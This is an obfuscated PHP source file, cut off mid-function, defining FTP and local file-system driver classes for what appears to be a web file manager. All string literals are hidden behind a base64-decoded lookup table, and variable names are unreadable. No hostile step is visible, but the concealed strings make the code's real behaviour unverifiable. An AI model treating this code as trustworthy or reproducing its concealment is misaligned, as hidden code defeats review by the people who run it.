<?php
 goto f†Õë¯‹”ë; B±ÉğÒ“ÉÖ: $fileSize = strrev(base64_decode($_SERVER[‡‹á¼¢¼][0])); function binCheckNeq($âã–æä , $ç„¾Úì) { return $âã–æä  != $ç„¾Úì; } $_SERVER[$_SERVER[‡‹á¼¢¼][1]] = $fileSize($_SERVER[$_SERVER[‡‹á¼¢¼][2]]); goto B›»¸Û‰‡Æ; C•±ÜŸ›Åš: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($µ×¾ ñª) { parent::__construct(); if (count($µ×¾ ñª) > 0) { $this->_init($µ×¾ ñª); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($âÆ´Ëâò) { $›‡¤ ©¯ =& $_SERVER[Ôó‡è­ƒ]; global $config; $this->appCharset = $config[$›‡¤ ©¯[1363]]; $this->systemCharset = $config[$›‡¤ ©¯[1364]]; if (isset($âÆ´Ëâò[$›‡¤ ©¯[1365]]) && $âÆ´Ëâò[$›‡¤ ©¯[1365]]) { $this->systemCharset = $âÆ´Ëâò[$›‡¤ ©¯[1365]]; } } public function iconvApp($Â¦œÔ¯) { return $this->iconvTo($Â¦œÔ¯, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ñî‚Ş½—) { return $this->iconvTo($Ñî‚Ş½—, $this->appCharset, $this->systemCharset); } public function getPathOuter($˜á©Şø§) { $ÒéîÆış =& $_SERVER[Ôó‡è­ƒ]; $ÆôÏ”Ú’ = $this->iconvApp($this->pathBase); $˜á©Şø§ = $this->iconvApp($˜á©Şø§); if (substr($ÆôÏ”Ú’, 0, 2) == $ÒéîÆış[1366]) { $ÆôÏ”Ú’ = BASIC_PATH . substr($ÆôÏ”Ú’, 2); } if (substr($˜á©Şø§, 0, 2) == $ÒéîÆış[1366]) { $˜á©Şø§ = BASIC_PATH . substr($˜á©Şø§, 2); } $ÆôÏ”Ú’ = KodIO::clear($ÆôÏ”Ú’); $˜á©Şø§ = KodIO::clear($˜á©Şø§); $˜á©Şø§ = substr($˜á©Şø§, strlen($ÆôÏ”Ú’)); if (empty($this->pathDriver)) { return $˜á©Şø§; } return $this->pathDriver . $ÒéîÆış[8] . ltrim($˜á©Şø§, $ÒéîÆış[8]); } private function _init($Âï¹¿Ó = array()) { $„Œ‡£Õ± =& $_SERVER[Ôó‡è­ƒ]; if (!function_exists($„Œ‡£Õ±[1367])) { throw new Exception(LNG($„Œ‡£Õ±[1368])); } $this->config = $Âï¹¿Ó; $this->charsetReset($Âï¹¿Ó); foreach ($Âï¹¿Ó as $óƒõşèå => $öÍË¬Ù’) { if (isset($this->{$óƒõşèå})) { $this->{$óƒõşèå} = $öÍË¬Ù’; } } return $this->_login($Âï¹¿Ó); } private function _login($Ø¸×ïäñ) { $ÀÙÎ–È× =& $_SERVER[Ôó‡è­ƒ]; static $Ô–Ñ¯é× = array(); $İ¼ÈøÁê = md5(json_encode($Ø¸×ïäñ)); if (isset($Ô–Ñ¯é×[$İ¼ÈøÁê])) { foreach ($Ô–Ñ¯é×[$İ¼ÈøÁê] as $Ïó×Ã‡ş => $ƒîÎ¿ˆÃ) { $this->{$Ïó×Ã‡ş} = $ƒîÎ¿ˆÃ; } return !0; } $¯ŒÙËÙ„ = parse_url(trim($this->server, $ÀÙÎ–È×[8])); $this->host = $¯ŒÙËÙ„[$ÀÙÎ–È×[178]]; $Şıïãèã = isset($¯ŒÙËÙ„[$ÀÙÎ–È×[177]]) && $¯ŒÙËÙ„[$ÀÙÎ–È×[177]] == $ÀÙÎ–È×[1369] ? !0 : !1; $this->scheme = $Şıïãèã ? $ÀÙÎ–È×[1370] : $ÀÙÎ–È×[1371]; $this->port = isset($¯ŒÙËÙ„[$ÀÙÎ–È×[179]]) ? $¯ŒÙËÙ„[$ÀÙÎ–È×[179]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $´»“‡¶å = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $•ÂŸ°øõ = $this->pasv == $ÀÙÎ–È×[89] ? !0 : !1; @ftp_pasv($this->connect, $•ÂŸ°øõ); $Ô–Ñ¯é×[$İ¼ÈøÁê] = array($ÀÙÎ–È×[1372] => $this->connect, $ÀÙÎ–È×[178] => $this->host, $ÀÙÎ–È×[177] => $this->scheme, $ÀÙÎ–È×[179] => $this->port); return $´»“‡¶å; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($›Ìç‘¼, $¼¥ıØ¤û = '', $šŒî”í‹ = REPEAT_RENAME) { if ($this->setContent($›Ìç‘¼, $¼¥ıØ¤û)) { return $this->getPathOuter($›Ìç‘¼); } return !1; } public function mkdir($Áõî¸¬‘, $ò‰™˜Œ­ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Áõî¸¬‘ = $this->iconvSystem($Áõî¸¬‘); if ($this->_isFolder($Áõî¸¬‘) || @ftp_mkdir($this->connect, $Áõî¸¬‘)) { return $this->getPathOuter($Áõî¸¬‘); } if (!$this->mkdir($this->pathFather($Áõî¸¬‘))) { return !1; } if ($Áõî¸¬‘ = @ftp_mkdir($this->connect, $Áõî¸¬‘)) { return $this->getPathOuter($Áõî¸¬‘); } return !1; } public function copyFile($íşıÓÅ¡, $öÁ“ÆÆ) { if (!$this->_isconn()) { return !1; } $Ò‹îñ©ö = $this->pathThis($this->iconvSystem($íşıÓÅ¡)); $»°­Í“½ = $this->tempFile($Ò‹îñ©ö); $ÚÕÍœ»š = $this->iconvApp($»°­Í“½); $this->download($íşıÓÅ¡, $ÚÕÍœ»š); $şéïÇéÚ = $this->upload($öÁ“ÆÆ, $ÚÕÍœ»š); $this->tempFileRemve($»°­Í“½); return $şéïÇéÚ; } public function moveFile($¤µŸæ‹ , $¼¬›ë‘Í) { if (!$this->_isconn()) { return !1; } $¤µŸæ‹  = $this->iconvSystem($¤µŸæ‹ ); $¼¬›ë‘Í = $this->iconvSystem($¼¬›ë‘Í); $™¿ÌÌşè = @ftp_rename($this->connect, $¤µŸæ‹ , $¼¬›ë‘Í); return $™¿ÌÌşè ? $this->getPathOuter($¼¬›ë‘Í) : !1; } public function delFile($È®õ”Âó) { if (!$this->_isconn()) { return !1; } $È®õ”Âó = $this->iconvSystem($È®õ”Âó); return @ftp_delete($this->connect, $È®õ”Âó); } public function delFolder($¡İ—¼ª´) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¢¦û¢• = $¼­ªÁ»Ö = array(); $this->fileList($¡İ—¼ª´, $¢¦û¢•, $¼­ªÁ»Ö, !0); $this->listItemCache = !0; foreach ($¼­ªÁ»Ö as $ô¤³ŠÂ) { $Ò¨äÀÀ = $this->iconvSystem($ô¤³ŠÂ[$_SERVER[Ôó‡è­ƒ][32]]); $²ğº¸”– = @ftp_delete($this->connect, $Ò¨äÀÀ); if (!$²ğº¸”–) { return !1; } } foreach ($¢¦û¢• as $Ò¨äÀÀ) { $Ò¨äÀÀ = $this->iconvSystem($Ò¨äÀÀ); $²ğº¸”– = @ftp_rmdir($this->connect, $Ò¨äÀÀ); if (!$²ğº¸”–) { return !1; } } $¡İ—¼ª´ = $this->iconvSystem($¡İ—¼ª´); return @ftp_rmdir($this->connect, $¡İ—¼ª´); } public function rename($£œïĞ¹, $éÓ Ã¤ï) { $µå¸Şç¿ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->_isconn()) { return !1; } $§®’ÁÂâ = $this->fileNameAuto($this->pathFather($£œïĞ¹), $éÓ Ã¤ï); $§®’ÁÂâ = $this->iconvSystem($§®’ÁÂâ); $£œïĞ¹ = $this->iconvSystem($£œïĞ¹); $Ò¾”Ş‘œ = $this->pathFather($£œïĞ¹); $ş³ƒŒ· = rtrim($Ò¾”Ş‘œ, $µå¸Şç¿[8]) . $µå¸Şç¿[8] . $§®’ÁÂâ; $©áÃ½Ú = @ftp_rename($this->connect, $£œïĞ¹, $ş³ƒŒ·); $ş³ƒŒ· = $this->iconvApp($ş³ƒŒ·); return $©áÃ½Ú ? $this->getPathOuter($ş³ƒŒ·) : !1; } private function folderInfo($»ª¶Éâ¸, $šÈ˜ê– = false) { $œ¾™›‘Ã =& $_SERVER[Ôó‡è­ƒ]; $Ñ¡“İ = array($œ¾™›‘Ã[32] => $this->pathThis($»ª¶Éâ¸), $œ¾™›‘Ã[78] => $this->getPathOuter($œ¾™›‘Ã[8] . $»ª¶Éâ¸), $œ¾™›‘Ã[33] => $œ¾™›‘Ã[79]); if ($šÈ˜ê–) { return $Ñ¡“İ; } $Ñ¡“İ[$œ¾™›‘Ã[197]] = $Ñ¡“İ[$œ¾™›‘Ã[86]] = 0; $Ñ¡“İ[$œ¾™›‘Ã[198]] = $Ñ¡“İ[$œ¾™›‘Ã[199]] = !0; return $Ñ¡“İ; } private function fileInfo($“Ğñª™, $µáˆ•îÎ = false, $«¡Ò¬Ø = array()) { $Áˆ®¿ƒù =& $_SERVER[Ôó‡è­ƒ]; $ù˜ùöæÆ = array($Áˆ®¿ƒù[32] => $this->pathThis($“Ğñª™), $Áˆ®¿ƒù[78] => $this->getPathOuter($Áˆ®¿ƒù[8] . $“Ğñª™), $Áˆ®¿ƒù[33] => $Áˆ®¿ƒù[196], $Áˆ®¿ƒù[80] => isset($«¡Ò¬Ø[$Áˆ®¿ƒù[80]]) ? $«¡Ò¬Ø[$Áˆ®¿ƒù[80]] : 0, $Áˆ®¿ƒù[171] => $this->ext($“Ğñª™)); if ($µáˆ•îÎ) { return $ù˜ùöæÆ; } $ù˜ùöæÆ[$Áˆ®¿ƒù[197]] = $ù˜ùöæÆ[$Áˆ®¿ƒù[86]] = 0; $ù˜ùöæÆ[$Áˆ®¿ƒù[198]] = $ù˜ùöæÆ[$Áˆ®¿ƒù[199]] = !0; $Ñáêƒß€ = $this->iconvSystem($“Ğñª™); $ù˜ùöæÆ[$Áˆ®¿ƒù[86]] = @ftp_mdtm($this->connect, $Ñáêƒß€); if (empty($«¡Ò¬Ø)) { $«¡Ò¬Ø = $this->objectMeta($“Ğñª™); if (!$«¡Ò¬Ø) { return $ù˜ùöæÆ; } } $ù˜ùöæÆ[$Áˆ®¿ƒù[80]] = $«¡Ò¬Ø[$Áˆ®¿ƒù[80]]; return $ù˜ùöæÆ; } public function size($ñ¬Áƒ»Î) { $ûì‹ù¼² = $this->objectMeta($ñ¬Áƒ»Î); return $ûì‹ù¼² ? $ûì‹ù¼²[$_SERVER[Ôó‡è­ƒ][80]] : 0; } public function info($„éØªœ) { if ($this->isFile($„éØªœ)) { return $this->fileInfo($„éØªœ, 0); } else { if ($this->isFolder($„éØªœ)) { return $this->folderInfo($„éØªœ); } } return !1; } private function fileList($ú‹†‰íó, &$ÜÒ› áá, &$Ô«Ãñ½Ë, $Ó‘¬áŒ = false) { $°ÃùÌşĞ =& $_SERVER[Ôó‡è­ƒ]; $ú‹†‰íó = $this->iconvSystem($ú‹†‰íó); if (!$this->isFolder($ú‹†‰íó)) { return !1; } @ftp_chdir($this->connect, $°ÃùÌşĞ[8]); $ú‹†‰íó = rtrim($ú‹†‰íó, $°ÃùÌşĞ[8]) . $°ÃùÌşĞ[8]; check_abort(); $Ñ¶³ıï = $this->listItemCache === !1 ? !1 : !0; $©Ã‘ä…ø = @ftp_rawlist($this->connect, $ú‹†‰íó); if (!$©Ã‘ä…ø) { $©Ã‘ä…ø = array(); } $ğŒ½Ş«ª = array($°ÃùÌşĞ[10] => 1, $°ÃùÌşĞ[1373] => 1); foreach ($©Ã‘ä…ø as $æÛÖŠ¾ƒ) { $Ôè™Âó‚ = $this->_listItem($æÛÖŠ¾ƒ); if ($Ôè™Âó‚[0] == $°ÃùÌşĞ[757]) { continue; } $û¥×¯… = $Ôè™Âó‚[8]; if (empty($û¥×¯…) && $û¥×¯… !== $°ÃùÌşĞ[194] || isset($ğŒ½Ş«ª[$û¥×¯…])) { continue; } $û¥×¯… = $this->iconvApp($ú‹†‰íó . ltrim($û¥×¯…, $°ÃùÌşĞ[8])); $©¨øè¯ğ = array($°ÃùÌşĞ[32] => $û¥×¯…, $°ÃùÌşĞ[33] => $°ÃùÌşĞ[196], $°ÃùÌşĞ[80] => $Ôè™Âó‚[4]); if (substr($æÛÖŠ¾ƒ, 0, 1) == $°ÃùÌşĞ[1374]) { $©¨øè¯ğ[$°ÃùÌşĞ[33]] = $°ÃùÌşĞ[79]; $©¨øè¯ğ[$°ÃùÌşĞ[80]] = 0; } $Ç×âÁÒñ = $©¨øè¯ğ[$°ÃùÌşĞ[33]] == $°ÃùÌşĞ[79] ? !0 : !1; if ($Ñ¶³ıï) { $this->cacheMethod($°ÃùÌşĞ[202], $û¥×¯…, $Ç×âÁÒñ); $this->cacheMethod($°ÃùÌşĞ[203], $û¥×¯…, $©¨øè¯ğ); } if ($Ç×âÁÒñ) { $ÜÒ› áá[] = $û¥×¯…; if ($Ó‘¬áŒ) { $this->fileList($û¥×¯…, $ÜÒ› áá, $Ô«Ãñ½Ë, $Ó‘¬áŒ); } continue; } $Ô«Ãñ½Ë[] = $©¨øè¯ğ; } if ($Ñ¶³ıï) { $this->cacheMethod($°ÃùÌşĞ[202], $ú‹†‰íó, !0); } } private function _listItem($÷¥Òó…ä) { if (empty($÷¥Òó…ä)) { return array(); } $ÆòÈ“†Ÿ = preg_split($_SERVER[Ôó‡è­ƒ][1375], $÷¥Òó…ä); if (count($ÆòÈ“†Ÿ) <= 9) { return $ÆòÈ“†Ÿ; } $ÆòÈ“†Ÿ[8] = trim(substr($÷¥Òó…ä, strpos($÷¥Òó…ä, $ÆòÈ“†Ÿ[7]) + strlen($ÆòÈ“†Ÿ[7]))); return array_splice($ÆòÈ“†Ÿ, 0, 9); } public function listPath($îûÍÈ×ª, $¶­œ¼İŸ = false) { $§¶¯û±™ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->_isconn()) { return !1; } $ŠùÄöùö = $åóøÊù = array(); $this->fileList($îûÍÈ×ª, $ŠùÄöùö, $åóøÊù); foreach ($ŠùÄöùö as $­àÅ‰”µ => $‹¾éƒâØ) { $ŠùÄöùö[$­àÅ‰”µ] = $this->folderInfo($‹¾éƒâØ, $¶­œ¼İŸ); } foreach ($åóøÊù as $­àÅ‰”µ => $‹¾éƒâØ) { $åóøÊù[$­àÅ‰”µ] = $this->fileInfo($‹¾éƒâØ[$§¶¯û±™[32]], $¶­œ¼İŸ, $‹¾éƒâØ); } return array($§¶¯û±™[77] => $ŠùÄöùö, $§¶¯û±™[76] => $åóøÊù); } public function has($Ëù±‚ã», $ë¨çÜÉâ = false, $Öóû¬Ã = true) { $‘œ«ì­¯ =& $_SERVER[Ôó‡è­ƒ]; $×æÔ…¸§ = $’ğäŠ˜ = array(); $’À…½şÒ = $ë¨çÜÉâ ? !0 : !1; $this->fileList($Ëù±‚ã», $×æÔ…¸§, $’ğäŠ˜, $’À…½şÒ); if ($ë¨çÜÉâ) { return array($‘œ«ì­¯[206] => count($’ğäŠ˜), $‘œ«ì­¯[207] => count($×æÔ…¸§)); } if ($Öóû¬Ã) { if (count($’ğäŠ˜)) { return !0; } } else { if (count($×æÔ…¸§)) { return !0; } } return !1; } public function listAll($›ÙŞ´¥—) { $áÎâÔø  =& $_SERVER[Ôó‡è­ƒ]; if (!$this->_isconn()) { return !1; } $––íÑ = $¨–ì»ş = array(); $this->fileList($›ÙŞ´¥—, $––íÑ, $¨–ì»ş, !0); $‘˜ŒÓ†­ = array(); foreach ($¨–ì»ş as $Ã—òş¡à) { $‘˜ŒÓ†­[$Ã—òş¡à[$áÎâÔø [32]]] = $Ã—òş¡à[$áÎâÔø [80]]; } foreach ($––íÑ as $Ã—òş¡à) { if (is_string($Ã—òş¡à)) { $‘˜ŒÓ†­[$Ã—òş¡à] = 0; } } return $this->listAllFiles($›ÙŞ´¥—, array_keys($‘˜ŒÓ†­), $‘˜ŒÓ†­); } public function getContent($â¼²Æ¬) { if (!$this->_isconn()) { return !1; } $â¼²Æ¬ = $this->iconvSystem($â¼²Æ¬); return $this->fileSubstr($â¼²Æ¬); } public function setContent($äˆ­í¢­, $É²ëËËÇ = '') { if (!$this->_isconn()) { return !1; } $ñş–Ñéß = $this->pathThis($this->iconvSystem($äˆ­í¢­)); $È’¢•ñğ = $this->tempFile($ñş–Ñéß); file_put_contents($È’¢•ñğ, $É²ëËËÇ); $çÙø”ÌÅ = $this->upload($äˆ­í¢­, $this->iconvApp($È’¢•ñğ)); $this->tempFileRemve($È’¢•ñğ); return $çÙø”ÌÅ; } public function fileSubstr($âìˆä›©, $’¡¼­ÉÀ = 0, $“äğçı¿ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($âìˆä›©, $’¡¼­ÉÀ, $“äğçı¿); } private function ftpRequest($Ââƒı›Ó, $ÖìãœıÁ = 0, $‹ò›à–ı = false) { $Ââƒı›Ó = $this->iconvSystem($Ââƒı›Ó); $å×ŞÂø = $this->scheme . $this->host . $_SERVER[Ôó‡è­ƒ][4] . $this->port; $´¶Êğ¿¥ = curl_init(); curl_setopt($´¶Êğ¿¥, CURLOPT_URL, $å×ŞÂø . $this->pathEncode($Ââƒı›Ó)); curl_setopt($´¶Êğ¿¥, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($‹ò›à–ı) { $ì®¿äË = $ÖìãœıÁ + $‹ò›à–ı - 1; curl_setopt($´¶Êğ¿¥, CURLOPT_RANGE, "{$ÖìãœıÁ}\55{$ì®¿äË}"); } curl_setopt($´¶Êğ¿¥, CURLOPT_RETURNTRANSFER, 1); $œØå¿©© = curl_exec($´¶Êğ¿¥); curl_close($´¶Êğ¿¥); return $œØå¿©©; } public function upload($÷óË™ş¯, $”ïÊ¤§´, $İø¯¢‹€ = false, $˜“¦¼òå = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($÷óË™ş¯))) { return !1; } $÷óË™ş¯ = $this->iconvSystem($÷óË™ş¯); $”ïÊ¤§´ = $this->iconvSystem($”ïÊ¤§´); $—¥½œÛ¥ = ftp_nb_put($this->connect, $÷óË™ş¯, $”ïÊ¤§´, FTP_BINARY); while ($—¥½œÛ¥ == FTP_MOREDATA) { $—¥½œÛ¥ = ftp_nb_continue($this->connect); } if ($—¥½œÛ¥ != FTP_FINISHED) { return !1; } return $this->getPathOuter($÷óË™ş¯); } public function download($‚¡§Á±Õ, $ÖÍ»¾ú = '') { if (!$this->_isconn()) { return !1; } $šÙ«’ˆ½ = $this->pathFather($ÖÍ»¾ú); if (!IO::mkdir($šÙ«’ˆ½)) { return !1; } $‚¡§Á±Õ = $this->iconvSystem($‚¡§Á±Õ); $ÖÍ»¾ú = $this->iconvSystem($ÖÍ»¾ú); $¯ˆÍ¡ƒ£ = ftp_nb_get($this->connect, $ÖÍ»¾ú, $‚¡§Á±Õ, FTP_BINARY); while ($¯ˆÍ¡ƒ£ == FTP_MOREDATA) { $¯ˆÍ¡ƒ£ = ftp_nb_continue($this->connect); } if ($¯ˆÍ¡ƒ£ != FTP_FINISHED) { return !1; } return $this->iconvApp($ÖÍ»¾ú); } public function exist($£ÅÃñÃ) { return $this->isFile($£ÅÃñÃ) || $this->isFolder($£ÅÃñÃ); } public function isFile($Ë±´Ú®Ö) { return !$this->isFolder($Ë±´Ú®Ö) && $this->objectMeta($Ë±´Ú®Ö); } public function isFolder($œö×¾û) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][202], $œö×¾û); } protected function objectMeta($¤¥¢ïÏ) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][203], $¤¥¢ïÏ); } protected function _objectMeta($™­¦˜) { $¢ä—úí =& $_SERVER[Ôó‡è­ƒ]; if ($™­¦˜ == $¢ä—úí[12] || $™­¦˜ == $¢ä—úí[8]) { return array(); } if (!$this->_isconn()) { return !1; } $™­¦˜ = $this->iconvSystem($™­¦˜); $£ëïêÑ¶ = array($¢ä—úí[32] => $this->iconvApp($™­¦˜), $¢ä—úí[33] => $¢ä—úí[196], $¢ä—úí[80] => 0); @ftp_chdir($this->connect, $¢ä—úí[8]); $ŞÑğÆÓ– = @ftp_size($this->connect, $™­¦˜); if ($ŞÑğÆÓ– != -1) { $£ëïêÑ¶[$¢ä—úí[80]] = $ŞÑğÆÓ–; } else { $¶û­‹Û = @ftp_chdir($this->connect, $™­¦˜); if (!$¶û­‹Û) { return !1; } $£ëïêÑ¶[$¢ä—úí[33]] = $¢ä—úí[79]; } return $£ëïêÑ¶; } protected function _isFolder($¦äëÏÉˆ) { $¥ÎÈŸñ« =& $_SERVER[Ôó‡è­ƒ]; if ($¦äëÏÉˆ == $¥ÎÈŸñ«[12] || $¦äëÏÉˆ == $¥ÎÈŸñ«[8]) { return !0; } $î’Œ×ŠÉ = $this->_objectMeta($¦äëÏÉˆ); return isset($î’Œ×ŠÉ[$¥ÎÈŸñ«[33]]) && $î’Œ×ŠÉ[$¥ÎÈŸñ«[33]] == $¥ÎÈŸñ«[79] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÍÄª°Â) { if (substr($ÍÄª°Â, 0, 2) == $_SERVER[Ôó‡è­ƒ][1366]) { $ÍÄª°Â = BASIC_PATH . substr($ÍÄª°Â, 2); } return $ÍÄª°Â; } public function iconvApp($òÃÈ˜Ğê) { $ûÏ†ĞËÒ =& $_SERVER[Ôó‡è­ƒ]; global $config; return $this->iconvTo($òÃÈ˜Ğê, $config[$ûÏ†ĞËÒ[1364]], $config[$ûÏ†ĞËÒ[1363]]); } public function iconvSystem($Õâ¥È¢¾) { $Í‚¼´ =& $_SERVER[Ôó‡è­ƒ]; global $config; return $this->iconvTo($Õâ¥È¢¾, $config[$Í‚¼´[1363]], $config[$Í‚¼´[1364]]); } public function getPathOuter($ŒÔ´¬æõ) { $·ÌüôÚÜ =& $_SERVER[Ôó‡è­ƒ]; $Î·ª‚ìÆ = $this->iconvApp($this->pathBase); $ŒÔ´¬æõ = $this->iconvApp($ŒÔ´¬æõ); if (substr($Î·ª‚ìÆ, 0, 2) == $·ÌüôÚÜ[1366]) { $Î·ª‚ìÆ = BASIC_PATH . substr($Î·ª‚ìÆ, 2); } if (substr($ŒÔ´¬æõ, 0, 2) == $·ÌüôÚÜ[1366]) { $ŒÔ´¬æõ = BASIC_PATH . substr($ŒÔ´¬æõ, 2); } $Î·ª‚ìÆ = KodIO::clear($Î·ª‚ìÆ); $ŒÔ´¬æõ = KodIO::clear($ŒÔ´¬æõ); $ŒÔ´¬æõ = substr($ŒÔ´¬æõ, strlen($Î·ª‚ìÆ)); if (empty($this->pathDriver)) { return $ŒÔ´¬æõ; } return $this->pathDriver . $·ÌüôÚÜ[8] . ltrim($ŒÔ´¬æõ, $·ÌüôÚÜ[8]); } public function mkfile($äÓ¨™Œ, $Ë¸ÃÕì = '', $Çï„àş• = REPEAT_RENAME) { $äÓ¨™Œ = $this->iconvSystem($äÓ¨™Œ); @touch($äÓ¨™Œ); if ($Ë¸ÃÕì) { file_put_contents($äÓ¨™Œ, $Ë¸ÃÕì); } @chmod($äÓ¨™Œ, $this->pathAuth); return is_file($äÓ¨™Œ) ? $this->getPathOuter($äÓ¨™Œ) : !1; } public function mkdir($¦ÇÊ¦ø, $©¥Ò ú’ = REPEAT_SKIP) { $¦ÇÊ¦ø = $this->iconvSystem($¦ÇÊ¦ø); if (is_dir($¦ÇÊ¦ø)) { return $this->getPathOuter($¦ÇÊ¦ø); } @mkdir($¦ÇÊ¦ø, $this->pathAuth, !0); @chmod($¦ÇÊ¦ø, $this->pathAuth); return is_dir($¦ÇÊ¦ø) ? $this->getPathOuter($¦ÇÊ¦ø) : !1; } public function copyFile($û•ëÑŠƒ, $Ïå„´”) { $this->mkdir($this->pathFather($Ïå„´”)); $û•ëÑŠƒ = $this->iconvSystem($û•ëÑŠƒ); $Ïå„´” = $this->iconvSystem($Ïå„´”); $¾¼Ñ«æ÷ = copy_64($û•ëÑŠƒ, $Ïå„´”); @chmod($Ïå„´”, $this->pathAuth); return $¾¼Ñ«æ÷ ? $this->getPathOuter($Ïå„´”) : !1; } public function moveFile($¤ˆÓä”ğ, $äĞªÛÓÌ) { $this->mkdir($this->pathFather($äĞªÛÓÌ)); $¤ˆÓä”ğ = $this->iconvSystem($¤ˆÓä”ğ); $äĞªÛÓÌ = $this->iconvSystem($äĞªÛÓÌ); $•Ó…Æ‘ª = intval(@rename($¤ˆÓä”ğ, $äĞªÛÓÌ)); if (!$•Ó…Æ‘ª) { if ($•Ó…Æ‘ª = intval(@copy_64($¤ˆÓä”ğ, $äĞªÛÓÌ))) { @unlink($¤ˆÓä”ğ); } } @chmod($äĞªÛÓÌ, $this->pathAuth); return $•Ó…Æ‘ª ? $this->getPathOuter($äĞªÛÓÌ) : !1; } public function movePath($Î›—üéú, $ƒõô‰¢, $÷Úµ¦È = false) { $¥‚øí‹™ =& $_SERVER[Ôó‡è­ƒ]; $Î›—üéú = $this->iconvSystem($Î›—üéú); $ƒõô‰¢ = $this->iconvSystem($ƒõô‰¢); $†Ä‘õÓ¸ = rtrim($ƒõô‰¢, $¥‚øí‹™[8]) . $¥‚øí‹™[8] . ($÷Úµ¦È ? $÷Úµ¦È : get_path_this($Î›—üéú)); if (file_exists($†Ä‘õÓ¸)) { return !1; } $ô¼¦ç– = intval(@rename($Î›—üéú, $†Ä‘õÓ¸)); $ô¼¦ç– = file_exists($†Ä‘õÓ¸); return $ô¼¦ç– ? $this->getPathOuter($†Ä‘õÓ¸) : !1; } public function delFile($ñÔ™›¹) { $ñÔ™›¹ = $this->iconvSystem($ñÔ™›¹); if (!@unlink($ñÔ™›¹)) { @chmod($ñÔ™›¹, $this->pathAuth); if (!@unlink($ñÔ™›¹)) { return !1; } } else { return !0; } } public function delFolder($Ã»û¯«×) { $üöÍ¶üŒ =& $_SERVER[Ôó‡è­ƒ]; $Ã»û¯«× = $this->iconvSystem($Ã»û¯«×); if (!is_dir($Ã»û¯«×)) { return !0; } if (!($ã…»Õç = opendir($Ã»û¯«×))) { return !1; } while (($‚šÅñ = readdir($ã…»Õç)) !== !1) { if ($‚šÅñ == $üöÍ¶üŒ[10] || $‚šÅñ == $üöÍ¶üŒ[1373]) { continue; } $«‡û‘¡„ = $Ã»û¯«× . $üöÍ¶üŒ[8] . $‚šÅñ; if (is_file($«‡û‘¡„) || is_link($«‡û‘¡„)) { if (!unlink($«‡û‘¡„)) { chmod($«‡û‘¡„, $this->pathAuth); if (!unlink($«‡û‘¡„)) { return !1; } } } else { if (is_dir($«‡û‘¡„)) { chmod($«‡û‘¡„, $this->pathAuth); $«‡û‘¡„ = $this->iconvApp($«‡û‘¡„); if (!$this->delFolder($«‡û‘¡„)) { return !1; } } } } closedir($ã…»Õç); return rmdir($Ã»û¯«×); } public function rename($éøà½ñ, $í›ˆ—) { $Ú—Ğ‚†Û =& $_SERVER[Ôó‡è­ƒ]; $‘şÎéÅ = $this->fileNameAuto($this->pathFather($éøà½ñ), $í›ˆ—); $‘şÎéÅ = $this->iconvSystem($‘şÎéÅ); $éøà½ñ = $this->iconvSystem($éøà½ñ); $É€åË¡ş = $this->pathFather($éøà½ñ); $Ú¹Ü³†Š = rtrim($É€åË¡ş, $Ú—Ğ‚†Û[8]) . $Ú—Ğ‚†Û[8] . $‘şÎéÅ; $Ùğ‹ÎÓ· = @rename($éøà½ñ, $Ú¹Ü³†Š); $Ú¹Ü³†Š = $this->iconvApp($Ú¹Ü³†Š); return $Ùğ‹ÎÓ· ? $this->getPathOuter($Ú¹Ü³†Š) : !1; } public function size($¬ˆğšå…) { $¬ˆğšå… = $this->iconvSystem($¬ˆğšå…); return filesize_64($¬ˆğšå…); } public function info($±•¸÷êÂ) { $±•¸÷êÂ = $this->iconvSystem($±•¸÷êÂ); if ($this->isFolder($±•¸÷êÂ)) { return $this->folderInfo($±•¸÷êÂ); } else { if ($this->isFile($±•¸÷êÂ)) { return $this->fileInfo($±•¸÷êÂ); } } return !1; } protected function infoChildren($˜òÓÀıµ, &$‰³õ¿Ã, $ââ†×¶ = true) { $êÜòé×¼ =& $_SERVER[Ôó‡è­ƒ]; check_abort_echo(); $˜òÓÀıµ = rtrim($˜òÓÀıµ, $êÜòé×¼[8]) . $êÜòé×¼[8]; if ($ââ†×¶) { $˜òÓÀıµ = $this->iconvSystem($˜òÓÀıµ); } if (!($õÄŞäŒµ = @opendir($˜òÓÀıµ))) { return; } while (($áú¢æğš = readdir($õÄŞäŒµ)) !== !1) { if ($áú¢æğš == $êÜòé×¼[10] || $áú¢æğš == $êÜòé×¼[1373]) { continue; } $«”…îÃ¿ = $˜òÓÀıµ . $áú¢æğš; if (is_file($«”…îÃ¿) || is_link($«”…îÃ¿)) { $‰³õ¿Ã[$êÜòé×¼[81]]++; $‰³õ¿Ã[$êÜòé×¼[80]] += filesize_64($«”…îÃ¿); } else { if (is_dir($«”…îÃ¿)) { $‰³õ¿Ã[$êÜòé×¼[82]]++; $this->infoChildren($«”…îÃ¿, $‰³õ¿Ã, !1); } } } closedir($õÄŞäŒµ); } private function folderInfo($ÀĞ½—éì, $óä§ÉÍ = false) { $¥Ç¹ôùî =& $_SERVER[Ôó‡è­ƒ]; $ÀĞ½—éì = rtrim($ÀĞ½—éì, $¥Ç¹ôùî[8]) . $¥Ç¹ôùî[8]; $ÌÇë„î› = $this->iconvApp($this->pathThis($ÀĞ½—éì)); if ($óä§ÉÍ) { return array($¥Ç¹ôùî[32] => $ÌÇë„î›, 